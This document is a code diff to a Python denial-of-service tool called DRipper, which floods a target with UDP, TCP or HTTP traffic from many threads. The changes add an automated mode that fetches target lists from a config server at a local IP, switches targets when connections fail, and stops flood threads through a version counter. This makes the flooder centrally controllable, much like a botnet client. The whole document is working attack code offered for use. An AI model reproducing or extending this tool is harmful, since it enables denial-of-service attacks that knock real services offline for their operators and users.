@@ -10,6 +10,7 @@ import signal
 import threading
 import subprocess
 import urllib.request
+import requests
 from typing import List
 from base64 import b64decode
 from datetime import datetime
@@ -24,7 +25,7 @@ EPILOG = 'Example: python DRipper.py -s 192.168.0.1 -p 80 -t 100'
 GETTING_SERVER_IP_ERROR_MSG = ('Can\'t get server IP. Packet sending failed. Check your VPN.')
 SUCCESSFUL_CONNECTIONS_CHECK_PERIOD_SEC = 120
 NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG = ('There are no successful connections more than 2 min. '
-                                              'Check your VPN or change host/port.')
+                                       'Check your VPN or change host/port.')
 DEFAULT_CURRENT_IP_VALUE = '...detecting'
 
 lock = threading.Lock()
@@ -43,7 +44,7 @@ class Context:
     max_random_packet_len: int = 0
     random_packet_len: bool = False
     attack_method: str = None
-    
+
     protocol: str = 'http://'
     original_host: str = ''
     url: str = None
@@ -71,6 +72,9 @@ class Context:
 
     # Method-related stats
     http_codes_counter = defaultdict(int)
+
+    # threading control
+    runVersion = 1
 
 
 def get_app_version():
@@ -144,7 +148,7 @@ def get_random_port():
     return random.choice(ports)
 
 
-def down_it_udp(_ctx: Context):
+def down_it_udp(_ctx: Context, run_version):
     i = 1
     while True:
         extra_data = get_random_string(1, _ctx.max_random_packet_len) if _ctx.random_packet_len else ''
@@ -178,8 +182,11 @@ def down_it_udp(_ctx: Context):
         show_statistics(_ctx)
         time.sleep(.01)
 
+        if _ctx.runVersion != run_version:
+            break
 
-def down_it_http(_ctx: Context):
+
+def down_it_http(_ctx: Context, run_version):
     while True:
         http_headers = _ctx.headers
         http_headers['User-Agent'] = random.choice(_ctx.user_agents).strip()
@@ -201,9 +208,11 @@ def down_it_http(_ctx: Context):
         _ctx.packets_sent += 1
         show_statistics(_ctx)
         time.sleep(.01)
+        if _ctx.runVersion != run_version:
+            break
 
 
-def down_it_tcp(_ctx: Context):
+def down_it_tcp(_ctx: Context, run_version):
     """TCP flood."""
     while True:
         try:
@@ -229,6 +238,8 @@ def down_it_tcp(_ctx: Context):
             show_statistics(_ctx)
 
         time.sleep(.01)
+        if _ctx.runVersion != run_version:
+            break
 
 
 def logo():
@@ -323,7 +334,8 @@ def show_info(_ctx: Context):
     """Prints attack info to console."""
     logo()
 
-    my_ip_masked = get_first_ip_part(_ctx.current_ip) if _ctx.current_ip != DEFAULT_CURRENT_IP_VALUE else DEFAULT_CURRENT_IP_VALUE
+    my_ip_masked = get_first_ip_part(
+        _ctx.current_ip) if _ctx.current_ip != DEFAULT_CURRENT_IP_VALUE else DEFAULT_CURRENT_IP_VALUE
     is_random_packet_len = _ctx.attack_method in ('tcp', 'udp') and _ctx.random_packet_len
 
     if _ctx.current_ip:
@@ -448,11 +460,11 @@ def create_thread_pool(_ctx: Context) -> list:
     thread_pool = []
     for i in range(int(_ctx.threads)):
         if _ctx.attack_method == 'http':
-            thread_pool.append(threading.Thread(target=down_it_http, args=[_ctx]))
+            thread_pool.append(threading.Thread(target=down_it_http, args=[_ctx, _ctx.runVersion]))
         elif _ctx.attack_method == 'tcp':
-            thread_pool.append(threading.Thread(target=down_it_tcp, args=[_ctx]))
+            thread_pool.append(threading.Thread(target=down_it_tcp, args=[_ctx, _ctx.runVersion]))
         else:  # _ctx.attack_method == 'udp':
-            thread_pool.append(threading.Thread(target=down_it_udp, args=[_ctx]))
+            thread_pool.append(threading.Thread(target=down_it_udp, args=[_ctx, _ctx.runVersion]))
 
         thread_pool[i].daemon = True  # if thread is exist, it dies
         thread_pool[i].start()
@@ -553,11 +565,51 @@ def go_home(_ctx: Context):
         update_url(_ctx)
 
 
-def main():
-    """The main function to run the script from the command line."""
+def mainAutomated():
     parser = OptionParser(usage=USAGE, epilog=EPILOG)
     args = parse_args(parser)
+    while True:
+        time_with_config = 0
+        targets = requests.get('http://192.168.137.1:8080/configs').json()
+        target_id = 0
 
+        print("received targets: ")
+        print(targets)
+
+        target = targets[target_id]
+
+        init_attack(target, args, parser)
+
+        while time_with_config < 1800:
+            prev_success = _ctx.connections_success
+            prev_failed = _ctx.connections_failed
+
+            time.sleep(10)
+
+            time_with_config += 30
+            period_success = _ctx.connections_success - prev_success
+            period_failed = _ctx.connections_failed - prev_failed
+            if period_success < period_failed:
+                print("changing target")
+
+                kill_threads()
+                target_id += 1
+                if target_id < len(targets):
+                    target = targets[target_id]
+                    init_attack(target, args, parser)
+                else:
+                    break
+
+
+def init_attack(target, args, parser):
+    args[0].attack_method = target['protocol']
+    args[0].host = target['address']
+    args[0].port = target['port']
+
+    start_attack(parser, args)
+
+
+def start_attack(parser, args):
     if len(sys.argv) < 2 or not validate_input(args[0]):
         usage(parser)
 
@@ -571,7 +623,7 @@ def main():
 
     connect_host(_ctx)
 
-    print(_ctx.original_host, 'port:', _ctx.port,'threads:', _ctx.threads)
+    print(_ctx.original_host, 'port:', _ctx.port, 'threads:', _ctx.threads)
     print(('please wait...'))
 
     time.sleep(1)
@@ -581,17 +633,17 @@ def main():
 
     create_thread_pool(_ctx)
 
-    while True:
-        time.sleep(1)
+
+def kill_threads():
+    _ctx.runVersion += 1
 
 
 # Context should be in global scope
 _ctx = Context()
 
-
 if __name__ == '__main__':
     try:
-        sys.exit(main())
+        sys.exit(mainAutomated())
     except KeyboardInterrupt:  # The user hit Control-C
         sys.stderr.write('\n\nReceived keyboard interrupt, terminating.\n\n')
         sys.stderr.flush()
